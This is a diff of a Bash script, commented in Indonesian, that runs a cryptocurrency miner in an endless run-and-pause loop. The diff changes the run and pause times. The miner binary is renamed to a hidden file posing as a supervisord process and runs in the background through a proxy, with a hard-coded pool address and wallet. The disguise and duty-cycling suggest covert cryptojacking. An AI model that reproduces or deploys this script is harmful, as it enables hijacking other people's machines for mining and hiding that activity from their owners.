@@ -36,8 +36,8 @@ mv SRBMiner-MULTI .supervisord-wr
 APP="./.supervisord-wr --algorithm xelishashv2_pepew --disable-gpu --pool 103.249.70.7:5778 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker cpuXidx --password c=LTC,ID=8Xpepew --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8"
 
 # Interval waktu dalam detik
-RUN_TIME=300  # 5 menit
-WAIT_TIME=60  # 1 menit
+RUN_TIME=540  # 9 menit
+WAIT_TIME=120  # 2 menit
 
 # Loop tak terbatas
 while true; do
@@ -46,7 +46,7 @@ while true; do
     $APP &
     APP_PID=$!  # Simpan PID aplikasi
 
-    # Tunggu selama 5 menit
+    # Tunggu selama 9 menit
     sleep $RUN_TIME
 
     # Cek apakah proses masih berjalan
@@ -57,7 +57,7 @@ while true; do
         echo "Proses aplikasi tidak ditemukan, tidak perlu menghentikan."
     fi
 
-    # Tunggu selama 1 menit sebelum memulai ulang
+    # Tunggu selama 2 menit sebelum memulai ulang
     echo "Menunggu selama $WAIT_TIME detik sebelum memulai ulang."
     sleep $WAIT_TIME
 done
